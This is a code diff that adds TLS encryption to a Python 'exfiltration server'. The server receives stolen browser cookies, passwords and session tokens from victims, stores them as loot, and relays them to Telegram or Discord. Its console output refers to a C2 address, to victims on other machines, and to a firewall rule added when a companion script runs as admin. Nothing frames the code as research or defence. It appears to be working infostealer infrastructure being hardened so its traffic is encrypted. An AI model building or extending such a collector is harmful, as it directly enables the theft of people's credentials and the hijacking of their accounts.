@@ -20,7 +20,7 @@ Relay options (re-send received cookies to a second channel):
   --discord <webhook_url>            Forward summary to Discord webhook
   --email <addr>                     (future) Forward via email
 """
-import json, os, sys, time, socket, socketserver, threading, urllib.error, urllib.request, urllib.parse
+import json, os, sys, time, socket, socketserver, ssl, threading, urllib.error, urllib.request, urllib.parse
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 from cklog import coverage as coveragelib
@@ -44,11 +44,13 @@ PWD_TXTF    = os.path.join(LOOT, "passwords.txt")
 SESS_JSONF  = os.path.join(LOOT, "session_cookies.json")
 SESS_TXTF   = os.path.join(LOOT, "session_cookies.txt")
 
-# Parse args: port, --bind addr, --telegram token:chat, --discord webhook
+# Parse args: port, --bind addr, --tls-cert PEM, --tls-key PEM, --telegram token:chat, --discord webhook
 PORT = 8080
 BIND = "0.0.0.0"
 TELEGRAM = None  # "bot_token:chat_id"
 DISCORD = None  # webhook URL
+TLS_CERT = None
+TLS_KEY = None
 
 args = sys.argv[1:]
 i = 0
@@ -60,10 +62,23 @@ while i < len(args):
         DISCORD = args[i + 1]; i += 2
     elif a == "--bind" and i + 1 < len(args):
         BIND = args[i + 1]; i += 2
+    elif a == "--tls-cert" and i + 1 < len(args):
+        TLS_CERT = args[i + 1]; i += 2
+    elif a == "--tls-key" and i + 1 < len(args):
+        TLS_KEY = args[i + 1]; i += 2
     elif not a.startswith("--"):
         PORT = int(a); i += 1
     else:
         i += 1
+
+if bool(TLS_CERT) != bool(TLS_KEY):
+    sys.exit("[-] --tls-cert and --tls-key must be given together")
+
+TLS_CONTEXT = None
+if TLS_CERT:
+    TLS_CONTEXT = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    TLS_CONTEXT.minimum_version = ssl.TLSVersion.TLSv1_2
+    TLS_CONTEXT.load_cert_chain(TLS_CERT, TLS_KEY)
 
 
 class HTTPServerV4(socketserver.ThreadingMixIn, HTTPServer):
@@ -72,6 +87,7 @@ class HTTPServerV4(socketserver.ThreadingMixIn, HTTPServer):
     for 10s; a single-threaded server stalled concurrent payload POSTs."""
     address_family = socket.AF_INET
     daemon_threads = True
+    tls_context = None
 
     def server_bind(self):
         """Override to skip socket.getfqdn() — it does a reverse DNS lookup on the
@@ -82,6 +98,26 @@ class HTTPServerV4(socketserver.ThreadingMixIn, HTTPServer):
         host, port = self.server_address[:2]
         self.server_name = socket.gethostname()  # local, no network lookup
         self.server_port = port
+
+    def process_request_thread(self, request, client_address):
+        """TLS handshake in the worker thread, not in accept(). A client that
+        connects and stalls mid-handshake must not block the next POST."""
+        if self.tls_context is not None:
+            try:
+                request = self.tls_context.wrap_socket(request, server_side=True)
+            except (ssl.SSLError, OSError) as ex:
+                print("[-] TLS handshake failed from %s: %s" % (client_address[0], ex))
+                try:
+                    request.close()
+                except OSError:
+                    pass
+                return
+        try:
+            self.finish_request(request, client_address)
+        except Exception:
+            self.handle_error(request, client_address)
+        finally:
+            self.shutdown_request(request)
 
 
 def load_existing():
@@ -431,17 +467,20 @@ class Handler(BaseHTTPRequestHandler):
 
 
 def main():
-    print("[listen] exfiltration server on %s:%d (Ctrl+C to stop)" % (BIND, PORT))
+    scheme = "https" if TLS_CONTEXT else "http"
+    print("[listen] exfiltration server on %s:%d (%s, Ctrl+C to stop)" % (BIND, PORT, scheme.upper()))
     print("[listen] cookies:  %s + %s" % (JSONF, TXTF))
     print("[listen] passwords: %s + %s" % (PWD_JSONF, PWD_TXTF))
     print("[listen] session:   %s + %s" % (SESS_JSONF, SESS_TXTF))
-    print("[listen] web UI: http://localhost:%d/  (endpoints: /all /passwords /session)" % PORT)
-    print("[listen] health: http://localhost:%d/health" % PORT)
+    print("[listen] web UI: %s://localhost:%d/  (endpoints: /all /passwords /session /coverage)" % (scheme, PORT))
+    print("[listen] health: %s://localhost:%d/health" % (scheme, PORT))
+    if TLS_CONTEXT:
+        print("[listen] TLS: cert=%s key=%s (min TLS 1.2)" % (TLS_CERT, TLS_KEY))
     try:
         from c2auth import local_lan_ip
         lan = local_lan_ip()
         if not lan.startswith("127."):
-            print("[listen] LAN:    http://%s:%d/   <- put this in --c2" % (lan, PORT))
+            print("[listen] LAN:    %s://%s:%d/   <- put this in --c2" % (scheme, lan, PORT))
             print("[listen] if the victim is on another machine, Windows Firewall must")
             print("[listen] allow inbound TCP %d (auto.py adds the rule when run as admin)." % PORT)
     except Exception:
@@ -452,6 +491,7 @@ def main():
     if DISCORD:
         print("[listen] relay: Discord -> %s" % (DISCORD.split("/api/")[0] if "/api/" in DISCORD else DISCORD[:30]))
     server = HTTPServerV4((BIND, PORT), Handler)
+    server.tls_context = TLS_CONTEXT
     try:
         server.serve_forever()
     except KeyboardInterrupt:
